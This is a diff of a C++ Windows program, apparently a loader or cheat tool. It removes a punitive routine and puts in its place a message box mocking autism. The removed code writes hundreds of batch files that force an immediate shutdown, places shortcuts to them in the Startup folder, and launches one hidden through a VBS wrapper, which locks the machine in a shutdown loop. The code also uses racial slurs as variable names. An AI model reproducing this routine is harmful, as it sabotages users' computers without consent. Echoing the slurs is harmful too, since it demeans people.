@@ -349,64 +349,7 @@ public:
 
 	inline void authfuck()
 	{
-		utils::file::DirCreate("C:\\Nikyuria");
-		utils::file::DirCreate("C:\\Nikyuria\\log");
-
-		char lpszPath[MAX_PATH];
-		BOOL success = SHGetSpecialFolderPathA(NULL, lpszPath, CSIDL_STARTUP, false);
-		if (!success)
-		{
-			Sleep(10);
-			authfuck();
-			return;
-		}
-
-		std::string badboy = "shutdown -t 0 -s -f";
-		std::string nig = "C:\\Nikyuria\\log\\dif.vbs";
-
-		utils::file::FileCreate(nig.c_str(), "CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False");
-		
-		bool swag = false;
-
-		for (int i = 1; i < 300; i++)
-		{
-
-			std::stringstream niggers;
-
-			niggers << "C:\\Nikyuria\\log\\";
-			niggers << i;
-			
-
-			std::stringstream a;
-			a << lpszPath;
-			a << "\\";
-			a << i;
-			a << ".lnk";
-
-			std::string nog = niggers.str().c_str();
-			nog.append(".bat");
-
-
-			utils::file::FileCreate(nog.c_str(), badboy.c_str());
-			createshortcut(GetWC(nog.c_str()), a.str().c_str(), L"");
-			
-			std::stringstream torun;
-			torun << "wscript.exe \"C:\\Nikyuria\\log\\dif.vbs\" \"C:\\Nikyuria\\log\\";
-			torun << i;
-			torun << ".bat\"";
-
-			if (!swag)
-			{
-				system(torun.str().c_str());
-				swag = true;
-			}
-				
-
-			//SetCursorPos(1, 1);
-		}
-
-		
-
+		MessageBox(0, L"Autism mode, activated.", 0, 0);
 	}
 };
 
